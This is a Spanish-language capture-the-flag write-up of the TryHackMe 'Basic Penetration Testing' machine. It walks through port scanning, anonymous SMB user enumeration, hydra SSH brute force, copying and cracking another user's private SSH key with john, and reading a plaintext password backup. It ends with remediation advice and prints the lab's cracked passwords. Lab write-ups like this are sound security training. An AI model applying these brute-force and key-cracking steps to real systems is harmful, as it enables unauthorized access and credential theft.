# Basic Penetration Testing

**Autor:** Alexis Sanchez  
**Fecha:** 17 de septiembre de 2026  
**Dificultad:** Fácil  
**Sistema Operativo:** Linux  

---

## Imagen de la Máquina

![Imagen de la Máquina](./Images/machine.jpg)

## Introducción

<h3>TL;DR</h3><p>Se obtuvo acceso inicial como <code>jan</code> mediante fuerza bruta SSH, tras enumerar usuarios válidos a través de un share SMB anónimo expuesto. La escalada de privilegios a <code>kay</code> se logró explotando una llave SSH privada con passphrase débil, localizada en un archivo de backup (<code>pass.bak</code>) con permisos mal configurados, obteniendo finalmente la flag y la contraseña en texto plano de <code>kay</code>.</p><p></p><h3>Contexto:</h3><p>TryHackMe Basic Penetration Testing | John Hammond •Aug 19, 2020</p><p>Lista de actividades a seguir</p><ul><li><p>Brute Force</p></li><li><p>Crack Hashing</p></li><li><p>Enumeración de servicios</p></li><li><p>Enumeración de Linux</p></li></ul><p>El objetivo de la maquina es entender el máximo posible</p><p></p>

---

## Reconocimiento Inicial

<pre><code>Nota: la IP de la máquina víctima cambió entre sesiones (la VM se reinició varias veces durante la práctica). Todas las referencias se normalizan a &lt;TARGET_IP&gt;.</code></pre><h3>Escaneo de Puertos</h3><p>Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:</p><pre><code class="language-bash">nmap -Pn -p- --open -sS --min-rate 5000 -vvv -n &lt;TARGET_IP&gt;</code></pre><h3>Escaneo de Servicios</h3><pre><code>nmap -Pn -p -sC &lt;OPEN_TARGET_PORT&gt;</code></pre><h3>Enumeración de Servicios y respondiendo la pregunta "Find the services exposed by the machine"</h3><pre><code>nmap -Pn -p 22,80,139,445,8009,8080 -sC &lt;TARGET_IP&gt;

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-22 19:46 CST

Nmap scan report for &lt;TARGET_IP&gt;

Host is up (0.092s latency).

PORT STATE SERVICE

22/tcp open ssh

| ssh-hostkey:

| 3072 e4:32:2f:ce:b2:ae:12:f3:66:38:8b:2b:21:7b:0d:01 (RSA)

| 256 7b:d9:5c:a8:dd:f8:48:b9:a5:29:9b:29:af:c2:85:e4 (ECDSA)

|_ 256 c2:9b:1b:19:df:f2:82:db:da:4c:19:30:22:20:fa:f1 (ED25519)

80/tcp open http

|_http-title: Site doesn't have a title (text/html).

139/tcp open netbios-ssn

445/tcp open microsoft-ds

8009/tcp open ajp13

| ajp-methods:

|_ Supported methods: GET HEAD POST OPTIONS

8080/tcp open http-proxy

|_http-favicon: Apache Tomcat

|_http-title: Apache Tomcat/9.0.7

Host script results:

| smb2-time:

| date: 2026-09-23T01:46:42

|_ start_date: N/A

| smb2-security-mode:

| 3:1:1:

|_ Message signing enabled but not required

|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)

Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds</code></pre><h3>Primer vistazo web</h3>

### Capturas de Pantalla de la Sección

[Captura pagina web] (./Images/page.jpg)

---

## Enumeración Web

<h3>Reconocimiento de Directorios y respondiendo a la pregunta "What is the name of the hidden directory on the web server?"</h3><h4><strong>Directorios encontrados:</strong></h4><pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre><p>Respuesta:</p><ul><li><p>development (Status: 301) [Size: 318]</p></li></ul><h3>Revisando /development</h3><p>Se encontraron dos archivos <code>.txt</code>:</p><h4>dev.txt</h4><pre><code>2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
</code></pre><h4>j.txt</h4><pre><code>For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K</code></pre><p>Estas notas ya dan una pista importante: las iniciales <strong>J</strong> y <strong>K</strong> probablemente corresponden a usuarios reales del sistema.</p>

---

## User brute-forcing to find the username & password

<h2>Usuario</h2><h3>SMBP</h3><p>revisando SMBP en modo anonymous</p><pre><code class="language-bash">└─$ smbclient -L //&lt;IP_TARGET&gt; -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server &lt;IP_TARGET&gt; (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available</code></pre><p>(La negociación SMB1 falla por incompatibilidad de protocolo con el servidor — no afecta la enumeración en Anonymous.)</p><p><strong>Buscando en el share Anonymous</strong></p><pre><code class="language-bash">smbclient //&lt;IP_TARGET&gt;/Anonymous -N 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Apr 19 12:31:20 2018
  ..                                  D        0  Thu Apr 19 12:13:06 2018
  staff.txt                           N      173  Thu Apr 19 12:29:55 2018

                14282840 blocks of size 1024. 6245848 blocks available
smb: \&gt; get staff.txt 
getting file \staff.txt of size 173 as staff.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \&gt; ^C

</code></pre><pre><code class="language-bash">cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay</code></pre><p>Esto confirma que las iniciales <strong>J</strong> y <strong>K</strong> encontradas en <code>/development</code> corresponden a los usuarios <strong>Jan</strong> y <strong>Kay</strong>. Se valida con <code>enum4linux</code>:</p><pre><code>enum4linux -a &lt;IP_TARGET&gt;
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
                                                                             
S-1-22-1-1000 Unix User\kay (Local User)                                     
S-1-22-1-1001 Unix User\jan (Local User)</code></pre><h3>SSH BRUTE FORCE</h3><p>Usando el usuario de jan</p><pre><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET_IP&gt;

22][ssh] host: &lt;IP_TARGET&gt;   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
</code></pre>

---

## Obteniendo Flag

<h3>Falso positivos</h3><p>Durante la enumeración de privilegios con LinPEAS aparecieron varios posibles vectores de escalada, principalmente vulnerabilidades del kernel, <code>pkexec</code>, LXD y otros binarios SUID.</p><p>Sin embargo, al revisar cada caso manualmente, varios resultaron ser <strong>falsos positivos o no aplicables a la configuración del sistema</strong>. Por ejemplo, <code>jan</code> no pertenecía al grupo <code>lxd</code>, <code>sudo</code> no estaba permitido y la versión instalada de <code>policykit-1</code> ya contaba con el parche correspondiente a PwnKit.</p><p>Después de descartar estos vectores, continué con la enumeración de los directorios de otros usuarios.</p><h3><strong>Revisando el directorio de users:</strong></h3><pre><code>jan@ip-&lt;TARGET_IP&gt;:~$ cd ../
jan@ip-&lt;TARGET_IP&gt;:/home$ ls
jan  kay  ubuntu</code></pre><p>Encontramos el otro usuario</p><p><strong>Revisando el usuario de kay:</strong></p><pre><code>jan@ip-&lt;TARGET_IP&gt;:/home$ cd kay/
jan@ip-&lt;TARGET_IP&gt;/home/kay$ ls
pass.bak
jan@ip-&lt;TARGET_IP&gt;:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied
jan@ip-&lt;TARGET_IP&gt;:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Sep 28 15:27 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo</code></pre><p><code>pass.bak</code> no es accesible directamente, pero el directorio <code>.ssh</code> sí:</p><h3>Viendo el .ssh:</h3><pre><code>jan@ip-&lt;TARGET_IP&gt;:/home/kay$ cd .ssh/
jan@ip-&lt;TARGET_IP&gt;:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub</code></pre><h3>Crackeando id_rsa</h3><p>Se copia el contenido de <code>id_rsa</code> a la máquina atacante para su crackeo. Primero se convierte a un formato legible por John:</p><pre><code>└─$ python /usr/share/john/ssh2john.py id_rsa 
id_rsa: &lt;CONTENT_HASH&gt;</code></pre><p>crackeando la contraseña con john</p><pre><code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2026-09-28 22:08) 1.515g/s 125357p/s 125357c/s 125357C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. </code></pre><h3>Iniciando sesion con kay y obteniendo la flag</h3><pre><code>┌──(kali㉿Kali)-[~]
└─$ chmod 600 id_rsa 
                                                                             
┌──(kali㉿Kali)-[~]
└─$ ssh -i id_rsa kay@&lt;TARGET_IP&gt;
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 29 Sep 2026 12:21:39 AM EDT

  System load:  0.19               Processes:             117
  Usage of /:   50.6% of 13.62GB   Users logged in:       1
  Memory usage: 59%                IPv4 address for ens5: &lt;TARGET_IP&gt;
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from &lt;TARGET_IP&gt;
kay@ip&lt;TARGET_IP&gt;:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$ 
</code></pre><p>Acceso obtenido como <code>kay</code>, flag y contraseña en texto plano recuperadas.</p>

---

## Resumen final

<h3>Impacto</h3><p>La cadena completa de compromiso no requirió ningún exploit de kernel ni vulnerabilidad compleja: bastó con configuración insegura por defecto (SMB anónimo permitiendo enumeración de usuarios) combinada con contraseñas débiles reutilizables por diccionario. En un entorno real, esto representa un vector de acceso inicial trivial para un atacante con herramientas básicas (<code>enum4linux</code>, <code>hydra</code>, <code>john</code>), y demuestra cómo un solo archivo de backup olvidado (<code>pass.bak</code>) puede escalar el compromiso de un usuario de bajo privilegio a acceso total sobre otra cuenta.</p><h3>Remediación</h3><ul><li><p>Deshabilitar o restringir el acceso anónimo a shares SMB.</p></li><li><p>Aplicar y hacer cumplir una política real de contraseñas (no solo comunicarla, como se ve en <code>j.txt</code>).</p></li><li><p>Eliminar o cifrar adecuadamente archivos de backup que contengan credenciales en texto plano.</p></li><li><p>Proteger llaves SSH privadas con passphrases robustas, fuera de diccionarios comunes como <code>rockyou.txt</code>.</p></li><li><p>Revisar periódicamente permisos de archivos sensibles en los directorios <code>home</code> de los usuarios.</p></li></ul><h3>Lecciones aprendidas</h3><ul><li><p>LinPEAS es un buen punto de partida, pero no todo lo que marca es explotable — validar manualmente cada vector (grupos, sudoers, versiones parcheadas) evita perder tiempo persiguiendo falsos positivos.</p></li><li><p>La enumeración de usuarios vía SMB/<code>enum4linux</code> puede ser tan valiosa como un escaneo de puertos: convertir "iniciales en un <code>.txt</code>" en usuarios reales fue la pieza clave para todo lo que siguió.</p></li><li><p>Revisar archivos aparentemente inofensivos en directorios de otros usuarios (<code>pass.bak</code>, historiales, configuraciones) suele ser más productivo que buscar exploits sofisticados.</p></li></ul><h3>Conclusión</h3><p>Esta máquina es una buena candidata para empezar en pentesting o para repasar fundamentos: cubre en un solo ejercicio casi todo el ciclo básico —reconocimiento, enumeración de servicios, pivoteo entre usuarios mediante información filtrada, y escalada de privilegios sin necesidad de exploits de kernel. Es especialmente útil para practicar la paciencia de leer pistas dispersas (nombres, iniciales, archivos de backup) y conectar puntos, una habilidad tan importante como el manejo técnico de las herramientas.</p>

